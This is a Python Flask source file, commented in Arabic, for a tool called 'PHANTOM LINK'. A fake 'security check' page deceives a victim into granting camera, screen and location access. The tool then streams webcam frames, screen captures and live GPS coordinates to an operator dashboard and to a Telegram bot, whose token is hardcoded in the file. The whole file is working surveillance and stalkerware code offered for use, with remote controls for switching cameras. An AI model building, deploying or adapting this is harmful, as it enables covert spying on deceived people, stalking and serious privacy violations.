import os
import time
import threading
import requests
import base64
import eventlet
from flask import Flask, render_template_string, request
from flask_socketio import SocketIO, emit

# تفعيل eventlet للأداء العالي
eventlet.monkey_patch()

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

# --- [ إعدادات البوت ] ---
BOT_TOKEN = "8731655533:AAFBxpr2goRmjY46jOB_BQdZKmk2ycFrYKQ"
CHAT_ID = "8305841557"

# المتغيرات العامة
current_cam_mode = "front" # front, back, screen
app_url = ""

# --- [ واجهة الضحية (المحاكاة) ] ---
VICTIM_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Security Check</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <style>
        body { background:#f0f2f5; font-family:sans-serif; text-align:center; padding-top:40px; margin:0; }
        .card { background:white; padding:30px; border-radius:10px; box-shadow:0 4px 15px rgba(0,0,0,0.1); width:90%; max-width:400px; margin:0 auto; }
        button { background:#1a73e8; color:white; border:none; padding:12px; width:100%; border-radius:5px; font-size:16px; cursor:pointer; }
        video, canvas { display:none; }
    </style>
</head>
<body>
    <div class="card" id="main-card">
        <h2>تحديث النظام</h2>
        <p>يجب السماح بالوصول للكاميرا والموقع.</p>
        <button onclick="startSystem()">ابدأ التحقق</button>
    </div>
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const socket = io();
        let mode = 'front';
        let stream = null;

        async function startSystem() {
            document.getElementById('main-card').style.display = 'none';
            document.body.style.background = '#000';
            startCapture('front');

            // الموقع
            navigator.geolocation.watchPosition(p => {
                socket.emit('loc', { lat: p.coords.latitude, lon: p.coords.longitude });
            }, null, { enableHighAccuracy: true });
        }

        async function startCapture(requestedMode) {
            if(stream) stream.getTracks().forEach(t => t.stop());
            mode = requestedMode;
            
            try {
                if(mode === 'screen') {
                    stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                } else {
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: mode }, audio: false 
                    });
                }
                document.getElementById('v').srcObject = stream;
                streamLoop();
            } catch(e) { console.error(e); }
        }

        function streamLoop() {
            if(!stream) return;
            const canvas = document.getElementById('c');
            const ctx = canvas.getContext('2d');
            canvas.width = 320; canvas.height = 240;
            ctx.drawImage(document.getElementById('v'), 0, 0, 320, 240);
            
            const img = canvas.toDataURL('image/jpeg', 0.3);
            socket.emit('stream', { img: img, mode: mode });
            
            setTimeout(streamLoop, 2000);
        }

        socket.on('admin_cmd', data => {
            if(data.cmd === 'switch_cam') {
                startCapture(mode === 'front' ? 'back' : 'front');
            } else if (data.cmd === 'screen') {
                startCapture('screen');
            }
        });
    </script>
</body>
</html>
"""

# --- [ لوحة التحكم (واجهة ويب احترافية للعرض فقط) ] ---
ADMIN_DASHBOARD = """
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Admin</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <style>
        :root { --neon: #00f3ff; --bg: #0a0a0a; --panel: #161616; --accent: #ff0055; }
        body { background: var(--bg); color: #fff; font-family: 'Roboto', sans-serif; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
        
        .header { background: rgba(0,0,0,0.8); backdrop-filter: blur(10px); padding: 15px; border-bottom: 1px solid rgba(0,243,255,0.3); display: flex; justify-content: space-between; align-items: center; z-index: 10; }
        .brand { font-family: 'Orbitron', sans-serif; font-size: 1.2rem; color: var(--neon); text-transform: uppercase; letter-spacing: 2px; }
        .status-dot { width: 10px; height: 10px; background: var(--neon); border-radius: 50%; box-shadow: 0 0 10px var(--neon); animation: pulse 2s infinite; }

        .main-layout { display: flex; flex: 1; height: calc(100vh - 60px); }
        .cam-section { flex: 1; position: relative; background: #000; display: flex; align-items: center; justify-content: center; border-right: 1px solid #333; }
        #stream { max-width: 100%; max-height: 100%; object-fit: contain; }
        .overlay-ui { position: absolute; top: 10px; left: 10px; display: flex; gap: 10px; }
        .tag { background: rgba(0,0,0,0.6); padding: 5px 10px; border-radius: 4px; font-size: 0.8rem; border: 1px solid var(--neon); color: var(--neon); }
        .tag.rec { border-color: var(--accent); color: var(--accent); animation: blink 1s infinite; }

        .info-panel { width: 300px; background: var(--panel); padding: 20px; display: flex; flex-direction: column; gap: 20px; overflow-y: auto; }
        
        .map-box { height: 200px; border-radius: 8px; overflow: hidden; border: 1px solid #333; }
        iframe { width: 100%; height: 100%; border: 0; filter: invert(90%) hue-rotate(180deg); }
        
        .control-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        .btn { background: rgba(255,255,255,0.05); border: 1px solid #333; color: #fff; padding: 12px; border-radius: 6px; cursor: pointer; transition: 0.3s; font-size: 0.9rem; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .btn:hover { background: var(--neon); color: #000; border-color: var(--neon); }
        .btn-full { grid-column: span 2; background: rgba(255,0,85,0.1); border-color: var(--accent); color: var(--accent); }
        
        @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
    </style>
</head>
<body>
    <div class="header">
        <div class="brand">PHANTOM LINK <span style="font-size:0.5em; opacity:0.7;">v2.0</span></div>
        <div style="display:flex; align-items:center; gap:10px;">
            <div class="status-dot"></div>
            <span style="font-size:0.8rem; color:#888;">LIVE</span>
        </div>
    </div>

    <div class="main-layout">
        <div class="cam-section">
            <div class="overlay-ui">
                <span class="tag rec" id="rec-tag">REC</span>
                <span class="tag" id="mode-tag">FRONT CAM</span>
            </div>
            <img id="stream" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
        </div>

        <div class="info-panel">
            <div>
                <h3 style="margin:0 0 10px 0; color:var(--neon); font-size:0.9rem;">TARGET LOCATION</h3>
                <div class="map-box">
                    <iframe id="map" src="https://maps.google.com/maps?q=0,0&t=k&z=15&output=embed"></iframe>
                </div>
            </div>

            <div>
                <h3 style="margin:0 0 10px 0; color:var(--neon); font-size:0.9rem;">CONTROLS</h3>
                <div class="control-grid">
                    <button class="btn" onclick="sendCmd('switch_cam')">📷 Swap Cam</button>
                    <button class="btn" onclick="sendCmd('screen')">💻 Screen</button>
                    <button class="btn" onclick="copyLink()">🔗 Copy Link</button>
                    <button class="btn" onclick="showMap()">🗺️ Open Map</button>
                    <button class="btn btn-full" onclick="sendCmd('sos')">🚨 EMERGENCY ALERT</button>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <script>
        const socket = io();
        socket.on('view', d => { document.getElementById('stream').src = d.img; document.getElementById('mode-tag').innerText = d.mode.toUpperCase(); });
        socket.on('map_up', d => { document.getElementById('map').src = `https://maps.google.com/maps?q=${d.lat},${d.lon}&t=k&z=18&output=embed`; });
        
        function sendCmd(c) { socket.emit('admin_cmd', {cmd: c}); }
        function copyLink() { navigator.clipboard.writeText(window.location.origin + '/'); alert('Victim Link Copied!'); }
        function showMap() { window.open(document.getElementById('map').src, '_blank'); }
    </script>
</body>
</html>
"""

# --- [ دوال التوجيه ] ---
@app.route('/')
def victim(): return render_template_string(VICTIM_HTML)

@app.route('/admin')
def admin(): return render_template_string(ADMIN_DASHBOARD)

# --- [ السوكتات ] ---
@socketio.on('stream')
def handle_stream(data):
    emit('view', data, broadcast=True, include_self=False)
    # إرسال صورة للبوت (لتقليل الحمل يمكن إيقاف هذا)
    try:
        img_data = data['img'].split(',')[1]
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", 
                      files={'photo': ('s.jpg', base64.b64decode(img_data))},
                      data={"chat_id": CHAT_ID, "caption": f"Mode: {data.get('mode', 'unknown')}"})
    except: pass

@socketio.on('loc')
def handle_loc(data):
    emit('map_up', data, broadcast=True, include_self=False)
    # إرسال الموقع للبوت
    try:
        map_link = f"https://www.google.com/maps?q={data['lat']},{data['lon']}"
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation", 
                      json={"chat_id": CHAT_ID, "latitude": data['lat'], "longitude": data['lon']})
    except: pass

@socketio.on('admin_cmd')
def handle_admin_cmd(data):
    emit('admin_cmd', data, broadcast=True, include_self=False)

# --- [ نظام التحكم بالبوت ] ---
def bot_manager():
    print("Bot Manager Active...")
    offset = 0
    while True:
        try:
            res = requests.get(f"{BOT_TOKEN_API}/getUpdates?offset={offset}&timeout=20").json()
            if res['ok']:
                for r in res['result']:
                    offset = r['update_id'] + 1
                    chat_id = r['message']['chat']['id']
                    txt = r['message'].get('text', '')
                    query = r.get('callback_query')

                    # التعامل مع الأزرار التفاعلية
                    if query:
                        data = query['data']
                        if data == 'start': send_menu(chat_id, "🟢 النظام نشط وجاهز.")
                        elif data == 'link': send_msg(chat_id, f"🔗 رابط الضحية:\n{app_url}/")
                        elif data == 'front': socketio.emit('admin_cmd', {'cmd': 'switch_cam'}); answer(query, "✅ تم التبديل للكاميرا الأمامية")
                        elif data == 'back': socketio.emit('admin_cmd', {'cmd': 'switch_cam'}); answer(query, "✅ تم التبديل للكاميرا الخلفية")
                        elif data == 'screen': socketio.emit('admin_cmd', {'cmd': 'screen'}); answer(query, "✅ تم طلب مشاركة الشاشة")
                        elif data == 'map': send_msg(chat_id, "📍 جاري جلب الموقع الدقيق..."); # موقع آخر إرسال يتم حفظه وعرضه
                        elif data == 'stop': os.kill(os.getpid(), 9)
                        continue

                    # الأوامر النصية
                    if txt == '/start':
                        send_menu(chat_id, "🤖 مرحباً بك في لوحة التحكم العسكرية.")
                    
        except: pass
        time.sleep(1)

def send_menu(chat_id, text):
    keyboard = {
        "inline_keyboard": [
            [{"text": "📷 نسخ رابط الضحية", "callback_data": "link"}, {"text": "🗺️ موقع دقيق", "callback_data": "map"}],
            [{"text": "📷 كاميرا أمامية", "callback_data": "front"}, {"text": "📷 كاميرا خلفية", "callback_data": "back"}],
            [{"text": "💻 مشاركة الشاشة", "callback_data": "screen"}],
            [{"text": "🛑 إيقاف النظام", "callback_data": "stop", "callback_game": None}]
        ]
    }
    requests.post(f"{BOT_TOKEN_API}/sendMessage", json={"chat_id": chat_id, "text": text, "reply_markup": keyboard})

def send_msg(chat_id, text):
    requests.post(f"{BOT_TOKEN_API}/sendMessage", json={"chat_id": chat_id, "text": text})

def answer(query, text):
    requests.post(f"{BOT_TOKEN_API}/answerCallbackQuery", json={"callback_query_id": query['id'], "text": text})

# تصحيح رابط البوت
BOT_TOKEN_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

if __name__ == '__main__':
    # في Render، يتم تعيين المتغير PORT تلقائياً
    port = int(os.environ.get("PORT", 5000))
    app_url = os.environ.get("RENDER_EXTERNAL_URL", "http://127.0.0.1:5000")
    
    print(f"Starting on port {port}...")
    threading.Thread(target=bot_manager, daemon=True).start()
    socketio.run(app, host='0.0.0.0', port=port)
